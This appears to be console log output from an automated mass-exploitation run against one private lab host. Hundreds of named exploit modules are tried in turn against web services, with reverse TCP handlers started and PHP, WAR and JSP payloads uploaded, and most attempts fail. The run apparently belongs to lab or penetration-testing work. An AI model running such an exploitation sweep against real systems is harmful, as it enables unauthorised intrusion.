[-] [2016.06.04-10:05:32] [0518] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:32] Workspace:lab5 Progress:523/775 (67%) [519/770] 10.198.0.1:80 - HP ProCurve Manager SNAC UpdateCertificatesServlet File Upload
[-] [2016.06.04-10:05:32] No reverse connect payloads available for exploit/windows/http/hp_pcm_snac_update_certificates
[-] [2016.06.04-10:05:32] No payloads were compatible with exploit/windows/http/hp_pcm_snac_update_certificates)
[-] [2016.06.04-10:05:32] [0519] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:33] Workspace:lab5 Progress:524/775 (67%) [520/770] 10.198.0.1:8080 - PolarBear CMS PHP File Upload Vulnerability
[+] [2016.06.04-10:05:33] Workspace:lab5 Progress:525/775 (67%) [521/770] 10.198.0.1:8080 - SonicWALL GMS 6 Arbitrary File Upload
[*] [2016.06.04-10:05:33] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:05:33] [0520] Started reverse TCP handler on 0.0.0.0:1350
[*] [2016.06.04-10:05:33] [0520] Uploading payload erMLU.php
[*] [2016.06.04-10:05:33] [0521] Started reverse TCP handler on 0.0.0.0:1351
[*] [2016.06.04-10:05:33] [0521] Retrieving Tomcat installation path...
[-] [2016.06.04-10:05:33] [0520] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Upload failed
[-] [2016.06.04-10:05:33] [0521] Exploit aborted due to failure: not-vulnerable: 10.198.0.1:8080 - Unable to retrieve the Tomcat installation path
[+] [2016.06.04-10:05:33] Workspace:lab5 Progress:526/775 (67%) [522/770] 10.198.0.1:8080 - DataLife Engine preview.php PHP Code Injection
[*] [2016.06.04-10:05:34] [0522] Started reverse TCP handler on 0.0.0.0:1352
[*] [2016.06.04-10:05:34] [0522] Exploiting the preg_replace() to execute PHP code
[+] [2016.06.04-10:05:34] Workspace:lab5 Progress:527/775 (68%) [523/770] 10.198.0.1:8080 - D-Link Devices Unauthenticated Remote Command Execution
[-] [2016.06.04-10:05:34] No reverse connect payloads available for exploit/linux/http/dlink_command_php_exec_noauth
[-] [2016.06.04-10:05:34] No payloads were compatible with exploit/linux/http/dlink_command_php_exec_noauth)
[*] [2016.06.04-10:05:34] [0523] 10.198.0.1:8080 - Telnet port used: 39186
[*] [2016.06.04-10:05:34] [0523] 10.198.0.1:8080 - Sending exploit request...
[*] [2016.06.04-10:05:34] [0523] 10.198.0.1:8080 - Trying to establish a telnet connection...
[-] [2016.06.04-10:05:34] [0523] Exploit failed [unreachable]: Rex::ConnectionRefused The connection was refused by the remote host (10.198.0.1:39186).
[+] [2016.06.04-10:05:35] Workspace:lab5 Progress:528/775 (68%) [524/770] 10.198.0.1:8080 - Glossword v1.8.8 - 1.8.12 Arbitrary File Upload Vulnerability
[*] [2016.06.04-10:05:35] [0524] Started reverse TCP handler on 0.0.0.0:1353
[*] [2016.06.04-10:05:35] [0524] Authenticating as user 'admin'
[-] [2016.06.04-10:05:36] [0524] Exploit aborted due to failure: no-access: 10.198.0.1:8080 - Authentication failed
[+] [2016.06.04-10:05:36] Workspace:lab5 Progress:529/775 (68%) [525/770] 10.198.0.1:80 - HP Intelligent Management Center BIMS UploadServlet Directory Traversal
[-] [2016.06.04-10:05:36] No reverse connect payloads available for exploit/windows/http/hp_imc_bims_upload
[-] [2016.06.04-10:05:36] No payloads were compatible with exploit/windows/http/hp_imc_bims_upload)
[-] [2016.06.04-10:05:36] [0525] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:36] Workspace:lab5 Progress:530/775 (68%) [526/770] 10.198.0.1:80 - HP LoadRunner EmulationAdmin Web Service Directory Traversal
[-] [2016.06.04-10:05:36] No reverse connect payloads available for exploit/windows/http/hp_loadrunner_copyfiletoserver
[-] [2016.06.04-10:05:36] No payloads were compatible with exploit/windows/http/hp_loadrunner_copyfiletoserver)
[-] [2016.06.04-10:05:36] [0526] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:37] Workspace:lab5 Progress:531/775 (68%) [527/770] 10.198.0.1:8080 - Linksys WRT160nv2 apply.cgi Remote Command Injection
[-] [2016.06.04-10:05:37] No reverse connect payloads available for exploit/linux/http/linksys_wrt160nv2_apply_exec
[-] [2016.06.04-10:05:37] No payloads were compatible with exploit/linux/http/linksys_wrt160nv2_apply_exec)
[+] [2016.06.04-10:05:37] Workspace:lab5 Progress:532/775 (68%) [528/770] 10.198.0.1:8080 - OpenEMR PHP File Upload Vulnerability
[*] [2016.06.04-10:05:37] [0528] Started reverse TCP handler on 0.0.0.0:1354
[*] [2016.06.04-10:05:37] [0528] Sending PHP payload (tnbhsPjnWCQhab.php)
[-] [2016.06.04-10:05:37] [0528] Exploit aborted due to failure: not-vulnerable: 10.198.0.1:8080 - File wasn't uploaded, aborting!
[+] [2016.06.04-10:05:37] Workspace:lab5 Progress:533/775 (68%) [529/770] 10.198.0.1:80 - Sophos Web Protection Appliance sblistpack Arbitrary Command Execution
[-] [2016.06.04-10:05:37] No reverse connect payloads available for exploit/linux/http/sophos_wpa_sblistpack_exec
[-] [2016.06.04-10:05:37] No payloads were compatible with exploit/linux/http/sophos_wpa_sblistpack_exec)
[-] [2016.06.04-10:05:38] [0529] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:38] Workspace:lab5 Progress:534/775 (68%) [530/770] 10.198.0.1:80 - Squash YAML Code Execution
[+] [2016.06.04-10:05:38] Workspace:lab5 Progress:535/775 (69%) [531/770] 10.198.0.1:8080 - Kordil EDMS v2.2.60rc3 Unauthenticated Arbitrary File Upload Vulnerability
[-] [2016.06.04-10:05:38] No reverse connect payloads available for exploit/unix/webapp/squash_yaml_exec
[-] [2016.06.04-10:05:38] No payloads were compatible with exploit/unix/webapp/squash_yaml_exec)
[-] [2016.06.04-10:05:38] [0530] Exploit failed: A payload has not been selected.
[*] [2016.06.04-10:05:38] [0531] Started reverse TCP handler on 0.0.0.0:1355
[*] [2016.06.04-10:05:38] [0531] Uploading PHP payload (946 bytes)
[-] [2016.06.04-10:05:38] [0531] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Uploading PHP payload failed
[+] [2016.06.04-10:05:39] Workspace:lab5 Progress:536/775 (69%) [532/770] 10.198.0.1:80 - Cisco Prime Data Center Network Manager Arbitrary File Upload
[*] [2016.06.04-10:05:39] [0532] Started reverse TCP handler on 0.0.0.0:1356
[*] [2016.06.04-10:05:39] [0532] Uploading WAR file 07bgwLi0K56P.war...
[+] [2016.06.04-10:05:39] Workspace:lab5 Progress:537/775 (69%) [533/770] 10.198.0.1:8080 - MiniWeb (Build 300) Arbitrary File Upload
[*] [2016.06.04-10:05:39] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:05:39] [0532] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Failed to upload the WAR payload
[-] [2016.06.04-10:05:39] [0533] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:MiniWeb)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:05:40] Workspace:lab5 Progress:538/775 (69%) [534/770] 10.198.0.1:8080 - WordPress W3 Total Cache PHP Code Execution
[*] [2016.06.04-10:05:40] [0534] Started reverse TCP handler on 0.0.0.0:1358
[-] [2016.06.04-10:05:40] [0534] Exploit aborted due to failure: no-target: / does not seeem to be Wordpress site
[+] [2016.06.04-10:05:40] Workspace:lab5 Progress:539/775 (69%) [535/770] 10.198.0.1:80 - Joomla Media Manager File Upload Vulnerability
[*] [2016.06.04-10:05:40] [0535] Started reverse TCP handler on 0.0.0.0:1359
[*] [2016.06.04-10:05:40] [0535] Checking Access to Media Component...
[-] [2016.06.04-10:05:40] [0535] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Failed to Access the Media Manager Component
[+] [2016.06.04-10:05:40] Workspace:lab5 Progress:540/775 (69%) [536/770] 10.198.0.1:8080 - phpMyAdmin Authenticated Remote Code Execution via preg_replace()
[*] [2016.06.04-10:05:41] [0536] Started reverse TCP handler on 0.0.0.0:1360
[*] [2016.06.04-10:05:41] [0536] Grabbing CSRF token...
[-] [2016.06.04-10:05:41] [0536] Exploit aborted due to failure: not-found: Couldn't find token. Is URI set correctly?
[+] [2016.06.04-10:05:41] Workspace:lab5 Progress:541/775 (69%) [537/770] 10.198.0.1:8080 - GroundWork monarch_scan.cgi OS Command Injection
[-] [2016.06.04-10:05:41] No reverse connect payloads available for exploit/linux/http/groundwork_monarch_cmd_exec
[-] [2016.06.04-10:05:41] No payloads were compatible with exploit/linux/http/groundwork_monarch_cmd_exec)
[-] [2016.06.04-10:05:41] [0537] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:41] Workspace:lab5 Progress:542/775 (69%) [538/770] 10.198.0.1:80 - OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution
[+] [2016.06.04-10:05:42] Workspace:lab5 Progress:543/775 (70%) [539/770] 10.198.0.1:80 - Western Digital Arkeia Remote Code Execution
[*] [2016.06.04-10:05:42] [0539] Started reverse TCP handler on 0.0.0.0:1362
[*] [2016.06.04-10:05:42] [0539] Sending PHP payload which will be uploaded to hardcoded /tmp/ApplianceUpdate
[-] [2016.06.04-10:05:42] [0539] Exploit aborted due to failure: none: 10.198.0.1:80 - File wasn't uploaded, aborting!
[+] [2016.06.04-10:05:42] Workspace:lab5 Progress:544/775 (70%) [540/770] 10.198.0.1:80 - FlashChat Arbitrary File Upload
[*] [2016.06.04-10:05:42] [0540] Started reverse TCP handler on 0.0.0.0:1363
[*] [2016.06.04-10:05:42] [0540] Uploading malicious file...
[*] [2016.06.04-10:05:42] [0540] Executing CTItWgbM7ks.php...
[+] [2016.06.04-10:05:42] Workspace:lab5 Progress:545/775 (70%) [541/770] 10.198.0.1:80 - WebTester 5.x Command Execution
[-] [2016.06.04-10:05:42] No reverse connect payloads available for exploit/unix/webapp/webtester_exec
[-] [2016.06.04-10:05:42] No payloads were compatible with exploit/unix/webapp/webtester_exec)
[-] [2016.06.04-10:05:43] [0541] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:43] Workspace:lab5 Progress:546/775 (70%) [542/770] 10.198.0.1:8080 - vBulletin index.php/ajax/api/reputation/vote nodeid Parameter SQL Injection
[*] [2016.06.04-10:05:43] [0542] Started reverse TCP handler on 0.0.0.0:1364
[*] [2016.06.04-10:05:43] [0542] Checking for a valid node id...
[*] [2016.06.04-10:05:43] [0542] Brute forcing to find a valid node id...
[!] [2016.06.04-10:05:45] [0540] This exploit may require manual cleanup of 'CTItWgbM7ks.php' on the target
[+] [2016.06.04-10:05:45] Workspace:lab5 Progress:547/775 (70%) [543/770] 10.198.0.1:8080 - D-Link Devices Unauthenticated Remote Command Execution
[-] [2016.06.04-10:05:45] No reverse connect payloads available for exploit/linux/http/dlink_dir300_exec_telnet
[-] [2016.06.04-10:05:45] No payloads were compatible with exploit/linux/http/dlink_dir300_exec_telnet)
[*] [2016.06.04-10:05:45] [0543] 10.198.0.1:8080 - Trying to login with admin / admin
[-] [2016.06.04-10:05:45] [0543] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Could not connect to the webservice - check the server banner
[+] [2016.06.04-10:05:46] Workspace:lab5 Progress:548/775 (70%) [544/770] 10.198.0.1:80 - ProcessMaker Open Source Authenticated PHP Code Execution
[*] [2016.06.04-10:05:46] [0544] Started reverse TCP handler on 0.0.0.0:1365
[*] [2016.06.04-10:05:46] [0544] Authenticating as user 'admin'
[-] [2016.06.04-10:05:46] [0544] Authenticating as user 'admin' failed
[-] [2016.06.04-10:05:46] [0544] Exploit aborted due to failure: no-access: 10.198.0.1:80 - Authentication failed
[+] [2016.06.04-10:05:46] Workspace:lab5 Progress:549/775 (70%) [545/770] 10.198.0.1:80 - Kaseya uploadImage Arbitrary File Upload
[*] [2016.06.04-10:05:46] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:05:46] [0545] Started reverse TCP handler on 0.0.0.0:1366
[*] [2016.06.04-10:05:46] [0545] Getting cookie...
[-] [2016.06.04-10:05:47] [0545] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Failed to get cookie
[+] [2016.06.04-10:05:47] Workspace:lab5 Progress:550/775 (70%) [546/770] 10.198.0.1:80 - Idera Up.Time Monitoring Station 7.0 post2file.php Arbitrary File Upload
[*] [2016.06.04-10:05:47] [0546] Started reverse TCP handler on 0.0.0.0:1367
[*] [2016.06.04-10:05:47] [0546] Uploading PHP to Up.Time server
[*] [2016.06.04-10:05:47] [0546] Uploading payload uOWmu.php
[-] [2016.06.04-10:05:47] [0546] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:80 - Upload failed
[+] [2016.06.04-10:05:47] Workspace:lab5 Progress:551/775 (71%) [547/770] 10.198.0.1:8080 - GetSimpleCMS PHP File Upload Vulnerability
[+] [2016.06.04-10:05:48] Workspace:lab5 Progress:552/775 (71%) [548/770] 10.198.0.1:8080 - Mutiny 5 Arbitrary File Upload
[*] [2016.06.04-10:05:48] [0548] Started reverse TCP handler on 0.0.0.0:1369
[*] [2016.06.04-10:05:48] [0548] Trying to login
[-] [2016.06.04-10:05:48] [0548] Exploit aborted due to failure: no-access: 10.198.0.1:8080 - Login failed, review USERNAME and PASSWORD options
[+] [2016.06.04-10:05:49] Workspace:lab5 Progress:553/775 (71%) [549/770] 10.198.0.1:8080 - Openfiler v2.x NetworkCard Command Execution
[-] [2016.06.04-10:05:49] No reverse connect payloads available for exploit/linux/http/openfiler_networkcard_exec
[-] [2016.06.04-10:05:49] No payloads were compatible with exploit/linux/http/openfiler_networkcard_exec)
[-] [2016.06.04-10:05:49] [0549] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:49] Workspace:lab5 Progress:554/775 (71%) [550/770] 10.198.0.1:8080 - ZPanel 10.0.0.2 htpasswd Module Username Command Execution
[-] [2016.06.04-10:05:49] No reverse connect payloads available for exploit/unix/webapp/zpanel_username_exec
[-] [2016.06.04-10:05:49] No payloads were compatible with exploit/unix/webapp/zpanel_username_exec)
[+] [2016.06.04-10:05:50] Workspace:lab5 Progress:555/775 (71%) [551/770] 10.198.0.1:8080 - LibrettoCMS File Manager Arbitary File Upload Vulnerability
[*] [2016.06.04-10:05:50] [0551] Started reverse TCP handler on 0.0.0.0:1370
[*] [2016.06.04-10:05:50] [0551] Uploading malicious file...
[-] [2016.06.04-10:05:50] [0551] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unknown reply: 404
[+] [2016.06.04-10:05:50] Workspace:lab5 Progress:556/775 (71%) [552/770] 10.198.0.1:80 - OpenSIS 'modname' PHP Code Execution
[-] [2016.06.04-10:05:50] No reverse connect payloads available for exploit/unix/webapp/opensis_modname_exec
[-] [2016.06.04-10:05:50] No payloads were compatible with exploit/unix/webapp/opensis_modname_exec)
[+] [2016.06.04-10:05:51] Workspace:lab5 Progress:557/775 (71%) [553/770] 10.198.0.1:80 - Symantec Endpoint Protection Manager /servlet/ConsoleServlet Remote Command Execution
[*] [2016.06.04-10:05:51] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:05:51] [0553] Started reverse TCP handler on 0.0.0.0:1371
[*] [2016.06.04-10:05:51] [0553] Sending payload
[-] [2016.06.04-10:05:52] [0553] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Something went wrong.
[+] [2016.06.04-10:05:53] Workspace:lab5 Progress:558/775 (72%) [554/770] 10.198.0.1:80 - Synology DiskStation Manager SLICEUPLOAD Remote Command Execution
[-] [2016.06.04-10:05:53] No reverse connect payloads available for exploit/linux/http/synology_dsm_sliceupload_exec_noauth
[-] [2016.06.04-10:05:53] No payloads were compatible with exploit/linux/http/synology_dsm_sliceupload_exec_noauth)
[-] [2016.06.04-10:05:53] [0554] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:53] Workspace:lab5 Progress:559/775 (72%) [555/770] 10.198.0.1:8080 - Havalite CMS Arbitary File Upload Vulnerability
[*] [2016.06.04-10:05:53] [0555] Started reverse TCP handler on 0.0.0.0:1372
[*] [2016.06.04-10:05:53] [0555] Uploading malicious file...
[-] [2016.06.04-10:05:53] [0555] Exploit aborted due to failure: not-found: 10.198.0.1:8080 - No upload.php found
[+] [2016.06.04-10:05:54] Workspace:lab5 Progress:560/775 (72%) [556/770] 10.198.0.1:8080 - Apache Struts 2 DefaultActionMapper Prefixes OGNL Code Execution
[*] [2016.06.04-10:05:54] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:05:54] [0556] Started reverse TCP handler on 0.0.0.0:1373
[*] [2016.06.04-10:05:54] [0556] 10.198.0.1:8080 - Target autodetection...
[-] [2016.06.04-10:05:55] [0556] Exploit aborted due to failure: no-target: 10.198.0.1:8080 - Target auto-detection didn't work
[+] [2016.06.04-10:05:55] Workspace:lab5 Progress:561/775 (72%) [557/770] 10.198.0.1:80 - Zimbra Collaboration Server LFI
[*] [2016.06.04-10:05:55] [0557] Started reverse TCP handler on 0.0.0.0:1375
[*] [2016.06.04-10:05:55] [0557] Getting login credentials...
[-] [2016.06.04-10:05:55] [0557] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 state=SSLv2/v3 read server hello A: unknown protocol
[+] [2016.06.04-10:05:56] Workspace:lab5 Progress:562/775 (72%) [558/770] 10.198.0.1:8080 - VMware vCenter Chargeback Manager ImageUploadServlet Arbitrary File Upload
[*] [2016.06.04-10:05:56] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[-] [2016.06.04-10:05:56] [0558] Exploit aborted due to failure: not-found: The target server fingerprint "Apache-Coyote/1.1" does not match "(?-mix:Apache.*Win32)", use 'set FingerprintCheck false' to disable this check.
[+] [2016.06.04-10:05:56] Workspace:lab5 Progress:563/775 (72%) [559/770] 10.198.0.1:8080 - Oracle Endeca Server Remote Command Execution
[*] [2016.06.04-10:05:57] [0559] Started reverse TCP handler on 0.0.0.0:1377
[*] [2016.06.04-10:05:57] [0559] Powershell command length: 2305
[*] [2016.06.04-10:05:57] [0559] Exploiting through Powershell...
[*] [2016.06.04-10:05:57] [0559] 404
<!DOCTYPE html><html><head><title>Apache Tomcat/8.0.14 (Debian) - Error report</title><style type="text/css">H1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} H2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} H3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} BODY {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} B {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} P {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;}A {color : black;}A.name {color : black;}.line {height: 1px; background-color: #525D76; border: none;}</style> </head><body><h1>HTTP Status 404 - /ws/control</h1><div class="line"></div><p><b>type</b> Status report</p><p><b>message</b> <u>/ws/control</u></p><p><b>description</b> <u>The requested resource is not available.</u></p><hr class="line"><h3>Apache Tomcat/8.0.14 (Debian)</h3></body></html>
[-] [2016.06.04-10:05:57] [0559] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Unable to execute the CMD Stager
[+] [2016.06.04-10:05:57] Workspace:lab5 Progress:564/775 (72%) [560/770] 10.198.0.1:8080 - PineApp Mail-SeCure livelog.html Arbitrary Command Execution
[-] [2016.06.04-10:05:57] No reverse connect payloads available for exploit/linux/http/pineapp_livelog_exec
[-] [2016.06.04-10:05:57] No payloads were compatible with exploit/linux/http/pineapp_livelog_exec)
[-] [2016.06.04-10:05:57] [0560] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:05:58] Workspace:lab5 Progress:565/775 (72%) [561/770] 10.198.0.1:8080 - PineApp Mail-SeCure ldapsyncnow.php Arbitrary Command Execution
[-] [2016.06.04-10:05:58] No reverse connect payloads available for exploit/linux/http/pineapp_ldapsyncnow_exec
[-] [2016.06.04-10:05:58] No payloads were compatible with exploit/linux/http/pineapp_ldapsyncnow_exec)
[-] [2016.06.04-10:05:58] [0561] Exploit failed: A payload has not been selected.
[-] [2016.06.04-10:05:58] [0542] node id not found
[+] [2016.06.04-10:05:58] Workspace:lab5 Progress:566/775 (73%) [562/770] 10.198.0.1:80 - ManageEngine Desktop Central AgentLogUpload Arbitrary File Upload
[*] [2016.06.04-10:05:58] Increasing WfsDelay to 5 minutes for Dynamic Stagers
[*] [2016.06.04-10:05:58] [0562] Started reverse TCP handler on 0.0.0.0:1378
[*] [2016.06.04-10:05:58] [0562] Uploading JSP to execute the payload
[-] [2016.06.04-10:05:59] [0562] Exploit aborted due to failure: unknown: 10.198.0.1:80 - JSP upload failed
[+] [2016.06.04-10:05:59] Workspace:lab5 Progress:567/775 (73%) [563/770] 10.198.0.1:8080 - PineApp Mail-SeCure test_li_connection.php Arbitrary Command Execution
[-] [2016.06.04-10:05:59] No reverse connect payloads available for exploit/linux/http/pineapp_test_li_conn_exec
[-] [2016.06.04-10:05:59] No payloads were compatible with exploit/linux/http/pineapp_test_li_conn_exec)
[-] [2016.06.04-10:06:00] [0563] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:00] Workspace:lab5 Progress:568/775 (73%) [564/770] 10.198.0.1:80 - MediaWiki Thumb.php Remote Command Execution
[*] [2016.06.04-10:06:00] [0564] Started reverse TCP handler on 0.0.0.0:1379
[*] [2016.06.04-10:06:00] [0564] Grabbing version and login CSRF token...
[*] [2016.06.04-10:06:00] [0564] Nix platform detected: Apache/2.4.10 (Debian).
[-] [2016.06.04-10:06:00] [0564] Exploit aborted due to failure: unexpected-reply: Couldn't find login token. Is URI set correctly?
[+] [2016.06.04-10:06:01] Workspace:lab5 Progress:569/775 (73%) [565/770] 10.198.0.1:80 - Symantec Workspace Streaming ManagementAgentServer.putFile XMLRPC Request Arbitrary File Upload
[*] [2016.06.04-10:06:01] [0565] Started reverse TCP handler on 0.0.0.0:1380
[*] [2016.06.04-10:06:01] [0565] Leaking the JBoss deployment directory...
[-] [2016.06.04-10:06:01] [0565] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Failed to disclose the JBoss deployment directory
[+] [2016.06.04-10:06:01] Workspace:lab5 Progress:570/775 (73%) [566/770] 10.198.0.1:8080 - vTiger CRM SOAP AddEmailAttachment Arbitrary File Upload
[*] [2016.06.04-10:06:01] [0566] Started reverse TCP handler on 0.0.0.0:1381
[*] [2016.06.04-10:06:01] [0566] Uploading payload...
[-] [2016.06.04-10:06:01] [0566] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Upload failed
[+] [2016.06.04-10:06:01] Workspace:lab5 Progress:571/775 (73%) [567/770] 10.198.0.1:8080 - OpenX Backdoor PHP Code Execution
[*] [2016.06.04-10:06:02] [0567] Started reverse TCP handler on 0.0.0.0:1382
[+] [2016.06.04-10:06:02] Workspace:lab5 Progress:572/775 (73%) [568/770] 10.198.0.1:8080 - VICIdial Manager Send OS Command Injection
[-] [2016.06.04-10:06:02] No reverse connect payloads available for exploit/unix/webapp/vicidial_manager_send_cmd_exec
[-] [2016.06.04-10:06:02] No payloads were compatible with exploit/unix/webapp/vicidial_manager_send_cmd_exec)
[-] [2016.06.04-10:06:02] [0568] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:02] Workspace:lab5 Progress:573/775 (73%) [569/770] 10.198.0.1:8080 - HP ProCurve Manager SNAC UpdateDomainControllerServlet File Upload
[-] [2016.06.04-10:06:03] No reverse connect payloads available for exploit/windows/http/hp_pcm_snac_update_domain
[-] [2016.06.04-10:06:03] No payloads were compatible with exploit/windows/http/hp_pcm_snac_update_domain)
[-] [2016.06.04-10:06:03] [0569] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:03] Workspace:lab5 Progress:574/775 (74%) [570/770] 10.198.0.1:8080 - HP ProCurve Manager SNAC UpdateCertificatesServlet File Upload
[-] [2016.06.04-10:06:03] No reverse connect payloads available for exploit/windows/http/hp_pcm_snac_update_certificates
[-] [2016.06.04-10:06:03] No payloads were compatible with exploit/windows/http/hp_pcm_snac_update_certificates)
[-] [2016.06.04-10:06:03] [0570] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:04] Workspace:lab5 Progress:575/775 (74%) [571/770] 10.198.0.1:80 - SkyBlueCanvas CMS Remote Code Execution
[-] [2016.06.04-10:06:04] No reverse connect payloads available for exploit/unix/webapp/skybluecanvas_exec
[-] [2016.06.04-10:06:04] No payloads were compatible with exploit/unix/webapp/skybluecanvas_exec)
[-] [2016.06.04-10:06:04] [0571] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:04] Workspace:lab5 Progress:576/775 (74%) [572/770] 10.198.0.1:8080 - HP Intelligent Management Center BIMS UploadServlet Directory Traversal
[-] [2016.06.04-10:06:04] No reverse connect payloads available for exploit/windows/http/hp_imc_bims_upload
[-] [2016.06.04-10:06:04] No payloads were compatible with exploit/windows/http/hp_imc_bims_upload)
[-] [2016.06.04-10:06:04] [0572] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:05] Workspace:lab5 Progress:577/775 (74%) [573/770] 10.198.0.1:80 - FreePBX config.php Remote Code Execution
[-] [2016.06.04-10:06:05] No reverse connect payloads available for exploit/unix/webapp/freepbx_config_exec
[-] [2016.06.04-10:06:05] No payloads were compatible with exploit/unix/webapp/freepbx_config_exec)
[-] [2016.06.04-10:06:05] [0573] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:05] Workspace:lab5 Progress:578/775 (74%) [574/770] 10.198.0.1:80 - Fritz!Box Webcm Unauthenticated Command Injection
[-] [2016.06.04-10:06:05] No reverse connect payloads available for exploit/linux/http/fritzbox_echo_exec
[-] [2016.06.04-10:06:05] No payloads were compatible with exploit/linux/http/fritzbox_echo_exec)
[-] [2016.06.04-10:06:05] [0574] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:06] Workspace:lab5 Progress:579/775 (74%) [575/770] 10.198.0.1:80 - Linksys E-Series TheMoon Remote Command Injection
[-] [2016.06.04-10:06:06] No reverse connect payloads available for exploit/linux/http/linksys_themoon_exec
[-] [2016.06.04-10:06:06] No payloads were compatible with exploit/linux/http/linksys_themoon_exec)
[-] [2016.06.04-10:06:06] [0575] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:06] Workspace:lab5 Progress:580/775 (74%) [576/770] 10.198.0.1:8080 - Sophos Web Protection Appliance sblistpack Arbitrary Command Execution
[-] [2016.06.04-10:06:06] No reverse connect payloads available for exploit/linux/http/sophos_wpa_sblistpack_exec
[-] [2016.06.04-10:06:06] No payloads were compatible with exploit/linux/http/sophos_wpa_sblistpack_exec)
[-] [2016.06.04-10:06:06] [0576] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:06] Workspace:lab5 Progress:581/775 (74%) [577/770] 10.198.0.1:80 - AlienVault OSSIM SQL Injection and Remote Code Execution
[-] [2016.06.04-10:06:07] No reverse connect payloads available for exploit/linux/http/alienvault_sqli_exec
[-] [2016.06.04-10:06:07] No payloads were compatible with exploit/linux/http/alienvault_sqli_exec)
[-] [2016.06.04-10:06:07] [0577] Exploit failed: A payload has not been selected.
[*] [2016.06.04-10:06:07] [0577] Cleaning up
[+] [2016.06.04-10:06:07] Workspace:lab5 Progress:582/775 (75%) [578/770] 10.198.0.1:8080 - Squash YAML Code Execution
[-] [2016.06.04-10:06:07] No reverse connect payloads available for exploit/unix/webapp/squash_yaml_exec
[-] [2016.06.04-10:06:07] No payloads were compatible with exploit/unix/webapp/squash_yaml_exec)
[-] [2016.06.04-10:06:07] [0578] Exploit failed: A payload has not been selected.
[+] [2016.06.04-10:06:07] Workspace:lab5 Progress:583/775 (75%) [579/770] 10.198.0.1:80 - ElasticSearch Dynamic Script Arbitrary Java Execution
[*] [2016.06.04-10:06:07] [0579] Started reverse TCP handler on 0.0.0.0:1383
[*] [2016.06.04-10:06:07] [0579] Trying to execute arbitrary Java...
[*] [2016.06.04-10:06:07] [0579] Trying to execute 'System.getProperty("java.version")'...
[-] [2016.06.04-10:06:07] [0579] 10.198.0.1:80 responded with HTTP code 302 (with a body)
[*] [2016.06.04-10:06:07] [0579] No results for the Java test
[-] [2016.06.04-10:06:07] [0579] Exploit aborted due to failure: unknown: 10.198.0.1:80 - Java has not been executed, aborting...
[+] [2016.06.04-10:06:08] Workspace:lab5 Progress:584/775 (75%) [580/770] 10.198.0.1:8080 - Cisco Prime Data Center Network Manager Arbitrary File Upload
[*] [2016.06.04-10:06:08] [0580] Started reverse TCP handler on 0.0.0.0:1384
[*] [2016.06.04-10:06:08] [0580] Uploading WAR file NiRUduCAbWR4hZk9DMhBXpZYdXdUUEH.war...
[-] [2016.06.04-10:06:08] [0580] Exploit aborted due to failure: unknown: 10.198.0.1:8080 - Failed to upload the WAR payload
[+] [2016.06.04-10:06:08] Workspace:lab5 Progress:585/775 (75%) [581/770] 10.198.0.1:8080 - Joomla Media Manager File Upload Vulnerability
[*] [2016.06.04-10:06:08] [0581] Started reverse TCP handler on 0.0.0.0:1385
[*] [2016.06.04-10:06:08] [0581] Checking Access to Media Component...
[-] [2016.06.04-10:06:08] [0581] Exploit aborted due to failure: unexpected-reply: 10.198.0.1:8080 - Failed to Access the Media Manager Component
[+] [2016.06.04-10:06:08] Workspace:lab5 Progress:586/775 (75%) [582/770] 10.198.0.1:8080 - OpenEMR 4.1.1 Patch 14 SQLi Privilege Escalation Remote Code Execution
[+] [2016.06.04-10:06:09] Workspace:lab5 Progress:587/775 (75%) [583/770] 10.198.0.1:80 - ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
